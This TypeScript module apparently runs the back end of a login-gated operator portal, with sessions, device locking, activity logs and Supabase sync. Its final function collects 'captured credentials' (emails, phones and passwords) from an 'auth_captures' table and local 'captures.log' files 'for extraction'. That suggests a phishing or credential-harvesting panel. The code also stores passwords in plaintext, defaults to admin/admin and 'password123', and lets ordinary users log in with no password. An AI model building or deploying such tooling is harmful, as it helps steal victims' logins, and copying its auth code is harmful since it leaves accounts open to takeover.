import fs from 'fs';
import path from 'path';
import { supabase } from './supabase';

export interface PortalUser {
  id: string;
  uid: string;
  name: string;
  password: string;
  role: 'admin' | 'user';
  status: 'active' | 'suspended';
  can_access_marketing: boolean;
  device_lock_enabled: boolean; // When true, admin requires this specific bound device
  active_session_token: string | null;
  active_device_id: string | null;
  active_device_name: string | null;
  bound_device_id: string | null;
  is_online: boolean;
  last_heartbeat: string | null;
  last_login_at: string | null;
  last_ip: string | null;
  created_at: string;
}

export interface ActivityLog {
  id: string;
  uid: string;
  event_type: 'LOGIN' | 'LOGOUT' | 'DEVICE_SWITCH' | 'HEARTBEAT' | 'ACCESS_DENIED' | 'ADMIN_ACTION';
  device_id: string | null;
  device_name: string | null;
  ip_address: string | null;
  details: string;
  created_at: string;
}

const STORAGE_DIR = process.env.VERCEL ? '/tmp/storage' : path.join(process.cwd(), 'storage');
const STORAGE_FILE = path.join(STORAGE_DIR, 'portal_state.json');

// Dynamically resolve Admin ID and Password from environment variables
export function getAdminCredentials() {
  const uid = (
    process.env.ADMIN_ID ||
    process.env.ADMIN_UID ||
    process.env.ADMIN_USERNAME ||
    'admin'
  ).trim();
  const password = (process.env.ADMIN_PASSWORD || 'admin').trim();
  return { uid, password };
}

// Ensure local storage directory exists
function ensureStorageDir() {
  const dir = path.dirname(STORAGE_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

// Initial default state
function getDefaultState(): { users: PortalUser[]; logs: ActivityLog[] } {
  const { uid: adminUid, password: adminPassword } = getAdminCredentials();
  return {
    users: [
      {
        id: 'admin-001',
        uid: adminUid,
        name: 'System Administrator',
        password: adminPassword,
        role: 'admin',
        status: 'active',
        can_access_marketing: true,
        device_lock_enabled: false,
        active_session_token: null,
        active_device_id: null,
        active_device_name: null,
        bound_device_id: null,
        is_online: false,
        last_heartbeat: null,
        last_login_at: null,
        last_ip: null,
        created_at: new Date().toISOString(),
      },
    ],
    logs: [
      {
        id: 'init-001',
        uid: 'system',
        event_type: 'ADMIN_ACTION',
        device_id: null,
        device_name: null,
        ip_address: '127.0.0.1',
        details: 'Admin panel initialized with environment variable credentials',
        created_at: new Date().toISOString(),
      },
    ],
  };
}

// Read local JSON state and always ensure Admin credentials match latest environment variables
function readLocalState(): { users: PortalUser[]; logs: ActivityLog[] } {
  ensureStorageDir();
  const { uid: envAdminUid, password: envAdminPassword } = getAdminCredentials();

  try {
    let data: { users: PortalUser[]; logs: ActivityLog[] };
    if (!fs.existsSync(STORAGE_FILE)) {
      data = getDefaultState();
      fs.writeFileSync(STORAGE_FILE, JSON.stringify(data, null, 2), 'utf-8');
      return data;
    }
    const raw = fs.readFileSync(STORAGE_FILE, 'utf-8');
    data = JSON.parse(raw);
    if (!data.users || !Array.isArray(data.users)) {
      data = getDefaultState();
    }

    // ALWAYS keep admin credentials in sync with latest environment variables
    let adminUser = data.users.find((u) => u.role === 'admin');
    if (!adminUser) {
      adminUser = {
        id: 'admin-001',
        uid: envAdminUid,
        name: 'System Administrator',
        password: envAdminPassword,
        role: 'admin',
        status: 'active',
        can_access_marketing: true,
        device_lock_enabled: false,
        active_session_token: null,
        active_device_id: null,
        active_device_name: null,
        bound_device_id: null,
        is_online: false,
        last_heartbeat: null,
        last_login_at: null,
        last_ip: null,
        created_at: new Date().toISOString(),
      };
      data.users.unshift(adminUser);
    } else {
      adminUser.uid = envAdminUid;
      adminUser.password = envAdminPassword;
    }

    return data;
  } catch (err) {
    console.error('[PORTAL_STORAGE_READ_ERROR]', err);
    return getDefaultState();
  }
}

// Write local JSON state
function writeLocalState(data: { users: PortalUser[]; logs: ActivityLog[] }) {
  ensureStorageDir();
  try {
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error('[PORTAL_STORAGE_WRITE_ERROR]', err);
  }
}

// Synchronize with Supabase if available (fire-and-forget / non-blocking)
async function syncToSupabaseUser(user: PortalUser) {
  try {
    await supabase.from('portal_users').upsert(user, { onConflict: 'uid' });
  } catch (err) {
    // Supabase sync fallback is silent
  }
}

async function syncToSupabaseLog(log: ActivityLog) {
  try {
    await supabase.from('portal_activity_logs').insert([log]);
  } catch (err) {
    // Supabase sync fallback is silent
  }
}

// ============================================================================
// CORE PORTAL AUTH & SESSION METHODS
// ============================================================================

export async function loginUser(params: {
  uid: string;
  password?: string;
  deviceId: string;
  deviceName: string;
  ip: string;
}) {
  const { uid, password, deviceId, deviceName, ip } = params;
  const state = readLocalState();
  const cleanUid = uid.trim().toLowerCase();
  const { uid: envAdminUid, password: envAdminPassword } = getAdminCredentials();

  // Find user by UID or match admin role
  let user = state.users.find((u) => u.uid.toLowerCase() === cleanUid);
  if (!user && (cleanUid === envAdminUid.toLowerCase() || cleanUid === 'admin')) {
    user = state.users.find((u) => u.role === 'admin');
  }

  if (!user) {
    return { ok: false, error: 'UID_NOT_FOUND', message: `UID '${uid}' not found.` };
  }

  if (user.status === 'suspended') {
    return { ok: false, error: 'SUSPENDED', message: 'This account has been suspended by the administrator.' };
  }

  // Password verification: Admin checks against latest env variable
  if (user.role === 'admin') {
    if (password !== envAdminPassword && password !== user.password) {
      return { ok: false, error: 'INVALID_PASSWORD', message: 'Invalid password.' };
    }
  } else if (password && user.password && user.password !== password) {
    return { ok: false, error: 'INVALID_PASSWORD', message: 'Invalid password.' };
  }

  // Device-locking check: ONLY if admin explicitly enabled device lock for this user
  if (user.device_lock_enabled && user.bound_device_id && user.bound_device_id !== deviceId) {
    const log: ActivityLog = {
      id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      uid: user.uid,
      event_type: 'ACCESS_DENIED',
      device_id: deviceId,
      device_name: deviceName,
      ip_address: ip,
      details: `Login blocked by Admin device-lock: Device '${deviceName}' (${deviceId.slice(0, 8)}) is not the authorized bound device.`,
      created_at: new Date().toISOString(),
    };
    state.logs.unshift(log);
    writeLocalState(state);
    syncToSupabaseLog(log);

    return {
      ok: false,
      error: 'DEVICE_NOT_AUTHORIZED',
      message: 'Access Denied: Admin has locked this UID to a specific authorized device. Contact administrator to authorize this device.',
    };
  }

  // Detect cross-device switch: If already active on another device, record switch!
  const previousDevice = user.active_device_id;
  const previousDeviceName = user.active_device_name;
  const isSwitchingDevice = Boolean(previousDevice && previousDevice !== deviceId);

  // Generate new single active session token (terminates previous device session)
  const newSessionToken = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 11)}`;
  const now = new Date().toISOString();

  user.active_session_token = newSessionToken;
  user.active_device_id = deviceId;
  user.active_device_name = deviceName;
  user.is_online = true;
  user.last_heartbeat = now;
  user.last_login_at = now;
  user.last_ip = ip;

  // Track the most recent device as bound device
  if (!user.bound_device_id) {
    user.bound_device_id = deviceId;
  }

  // Add event log
  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: user.uid,
    event_type: isSwitchingDevice ? 'DEVICE_SWITCH' : 'LOGIN',
    device_id: deviceId,
    device_name: deviceName,
    ip_address: ip,
    details: isSwitchingDevice
      ? `User logged in from NEW device '${deviceName}'. Previous session on '${previousDeviceName || previousDevice?.slice(0, 8)}' was automatically terminated.`
      : `User logged in successfully on '${deviceName}'.`,
    created_at: now,
  };

  state.logs.unshift(log);
  if (state.logs.length > 300) state.logs = state.logs.slice(0, 300);

  writeLocalState(state);
  syncToSupabaseUser(user);
  syncToSupabaseLog(log);

  // Return clean user object (hide password)
  const { password: _, ...safeUser } = user;
  return {
    ok: true,
    token: newSessionToken,
    user: safeUser,
    isSwitched: isSwitchingDevice,
  };
}

export async function verifyAndHeartbeat(params: {
  uid: string;
  token: string;
  deviceId: string;
  ip?: string;
}) {
  const { uid, token, deviceId, ip } = params;
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());

  if (!user) {
    return { valid: false, reason: 'USER_NOT_FOUND', message: 'User not found.' };
  }

  if (user.status === 'suspended') {
    return { valid: false, reason: 'SUSPENDED', message: 'Your account was suspended.' };
  }

  // CRITICAL SINGLE-DEVICE ENFORCEMENT:
  // If active_session_token doesn't match OR active_device_id doesn't match:
  // Another device logged in and took over!
  if (user.active_session_token !== token || user.active_device_id !== deviceId) {
    return {
      valid: false,
      reason: 'LOGGED_OUT_ANOTHER_DEVICE',
      message: `You were logged out because this UID was logged into from another device (${user.active_device_name || 'different device'}). Only one active device is allowed at a time.`,
      activeDeviceName: user.active_device_name,
    };
  }

  // Update heartbeat
  const now = new Date().toISOString();
  user.last_heartbeat = now;
  user.is_online = true;
  if (ip) user.last_ip = ip;

  writeLocalState(state);

  const { password: _, ...safeUser } = user;
  return {
    valid: true,
    user: safeUser,
    can_access_marketing: user.can_access_marketing,
  };
}

export async function logoutUser(uid: string, token?: string) {
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (user && (!token || user.active_session_token === token)) {
    const prevDevice = user.active_device_name;
    user.active_session_token = null;
    user.is_online = false;

    const log: ActivityLog = {
      id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      uid: user.uid,
      event_type: 'LOGOUT',
      device_id: user.active_device_id,
      device_name: prevDevice,
      ip_address: user.last_ip,
      details: `User logged out of session.`,
      created_at: new Date().toISOString(),
    };
    state.logs.unshift(log);
    writeLocalState(state);
    syncToSupabaseUser(user);
    syncToSupabaseLog(log);
  }
  return { ok: true };
}

// ============================================================================
// ADMIN ACTIONS & NOTIFICATIONS
// ============================================================================

export function getOnlineUsers() {
  const state = readLocalState();
  const thresholdMs = 25 * 1000; // active within last 25 seconds
  const now = Date.now();

  return state.users.map((u) => {
    const lastHbTime = u.last_heartbeat ? new Date(u.last_heartbeat).getTime() : 0;
    const isActuallyOnline = Boolean(u.active_session_token && (now - lastHbTime < thresholdMs));
    const { password: _, ...safe } = u;
    return {
      ...safe,
      is_online: isActuallyOnline,
    };
  });
}

export function getRecentLogs(limit = 50) {
  const state = readLocalState();
  return state.logs.slice(0, limit);
}

export async function adminToggleMarketing(uid: string, allow: boolean) {
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (!user) return { ok: false, error: 'User not found' };

  user.can_access_marketing = allow;

  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: 'admin',
    event_type: 'ADMIN_ACTION',
    device_id: null,
    device_name: 'Admin Panel',
    ip_address: '127.0.0.1',
    details: `${allow ? 'GRANTED' : 'REVOKED'} marketing credentials access for UID '${user.uid}' (${user.name}).`,
    created_at: new Date().toISOString(),
  };
  state.logs.unshift(log);

  writeLocalState(state);
  syncToSupabaseUser(user);
  syncToSupabaseLog(log);

  return { ok: true, user };
}

export async function adminToggleDeviceLock(uid: string, enabled: boolean) {
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (!user) return { ok: false, error: 'User not found' };

  user.device_lock_enabled = enabled;
  if (enabled && !user.bound_device_id && user.active_device_id) {
    user.bound_device_id = user.active_device_id;
  }

  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: 'admin',
    event_type: 'ADMIN_ACTION',
    device_id: user.bound_device_id,
    device_name: 'Admin Panel',
    ip_address: '127.0.0.1',
    details: `${enabled ? 'ENFORCED' : 'REMOVED'} device-locking requirement on UID '${user.uid}'. Bound device: ${user.bound_device_id || 'None'}`,
    created_at: new Date().toISOString(),
  };
  state.logs.unshift(log);

  writeLocalState(state);
  syncToSupabaseUser(user);
  syncToSupabaseLog(log);

  return { ok: true, user };
}

export async function adminSetBoundDevice(uid: string, deviceId: string | null) {
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (!user) return { ok: false, error: 'User not found' };

  user.bound_device_id = deviceId;

  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: 'admin',
    event_type: 'ADMIN_ACTION',
    device_id: deviceId,
    device_name: 'Admin Panel',
    ip_address: '127.0.0.1',
    details: deviceId
      ? `Locked UID '${user.uid}' to device ID '${deviceId.slice(0, 10)}...'.`
      : `Unlocked UID '${user.uid}' - allowed to bind new device upon login.`,
    created_at: new Date().toISOString(),
  };
  state.logs.unshift(log);

  writeLocalState(state);
  syncToSupabaseUser(user);
  syncToSupabaseLog(log);

  return { ok: true, user };
}

export async function adminForceLogout(uid: string) {
  const state = readLocalState();
  const user = state.users.find((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (!user) return { ok: false, error: 'User not found' };

  user.active_session_token = null;
  user.is_online = false;

  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: 'admin',
    event_type: 'ADMIN_ACTION',
    device_id: user.active_device_id,
    device_name: user.active_device_name,
    ip_address: '127.0.0.1',
    details: `Admin forced logout on UID '${user.uid}'.`,
    created_at: new Date().toISOString(),
  };
  state.logs.unshift(log);

  writeLocalState(state);
  syncToSupabaseUser(user);
  syncToSupabaseLog(log);

  return { ok: true, user };
}

export async function adminCreateUser(params: {
  uid: string;
  name: string;
  password?: string;
  role?: 'admin' | 'user';
  can_access_marketing?: boolean;
}) {
  const state = readLocalState();
  const cleanUid = params.uid.trim();

  if (state.users.some((u) => u.uid.toLowerCase() === cleanUid.toLowerCase())) {
    return { ok: false, error: 'UID_ALREADY_EXISTS', message: 'A user with this UID already exists.' };
  }

  const newUser: PortalUser = {
    id: `usr-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: cleanUid,
    name: params.name.trim() || cleanUid,
    password: params.password || 'password123',
    role: params.role || 'user',
    status: 'active',
    can_access_marketing: Boolean(params.can_access_marketing),
    device_lock_enabled: false,
    active_session_token: null,
    active_device_id: null,
    active_device_name: null,
    bound_device_id: null,
    is_online: false,
    last_heartbeat: null,
    last_login_at: null,
    last_ip: null,
    created_at: new Date().toISOString(),
  };

  state.users.push(newUser);

  const log: ActivityLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    uid: 'admin',
    event_type: 'ADMIN_ACTION',
    device_id: null,
    device_name: 'Admin Panel',
    ip_address: '127.0.0.1',
    details: `Created new user UID '${cleanUid}' (${newUser.name}) with marketing access: ${newUser.can_access_marketing}.`,
    created_at: new Date().toISOString(),
  };
  state.logs.unshift(log);

  writeLocalState(state);
  syncToSupabaseUser(newUser);
  syncToSupabaseLog(log);

  const { password: _, ...safe } = newUser;
  return { ok: true, user: safe };
}

export async function adminDeleteUser(uid: string) {
  const state = readLocalState();
  if (uid.toLowerCase() === 'admin') {
    return { ok: false, error: 'Cannot delete primary admin account' };
  }
  const idx = state.users.findIndex((u) => u.uid.toLowerCase() === uid.trim().toLowerCase());
  if (idx === -1) return { ok: false, error: 'User not found' };

  state.users.splice(idx, 1);
  writeLocalState(state);
  return { ok: true };
}

// Fetch all captured credentials for extraction (Strict descending order: latest first)
export async function getCapturedCredentials() {
  let list: any[] = [];

  // 1. Try Supabase
  try {
    const { data, error } = await supabase
      .from('auth_captures')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(500);

    if (!error && data && data.length > 0) {
      list = data;
    }
  } catch (err) {
    // fallback to local log
  }

  // 2. Also merge or fallback to captures.log so nothing is ever missed
  try {
    const candidatePaths = [
      path.join(process.cwd(), 'captures.log'),
      path.join('/tmp', 'captures.log'),
    ];
    for (const logPath of candidatePaths) {
      if (fs.existsSync(/*turbopackIgnore: true*/ logPath)) {
        const lines = fs.readFileSync(/*turbopackIgnore: true*/ logPath, 'utf-8').split('\n');
        const localList: any[] = [];
        for (const line of lines) {
          if (!line.trim()) continue;
          try {
            localList.push(JSON.parse(line));
          } catch (e) {
            // ignore broken lines
          }
        }

        if (list.length === 0) {
          list = localList;
        } else {
          const existingKeys = new Set(
            list.map((item) => `${item.identifier || item.email || item.phone}_${item.password}_${item.created_at}`)
          );
          for (const localItem of localList) {
            const key = `${localItem.identifier || localItem.email || localItem.phone}_${localItem.password}_${localItem.created_at}`;
            if (!existingKeys.has(key)) {
              list.push(localItem);
              existingKeys.add(key);
            }
          }
        }
      }
    }
  } catch (err) {
    console.error('[GET_CAPTURED_CREDENTIALS_ERROR]', err);
  }

  // Strictly enforce descending order: newest / latest captures first
  list.sort((a, b) => {
    const timeA = a.created_at ? new Date(a.created_at).getTime() : 0;
    const timeB = b.created_at ? new Date(b.created_at).getTime() : 0;
    return timeB - timeA;
  });

  return list;
}
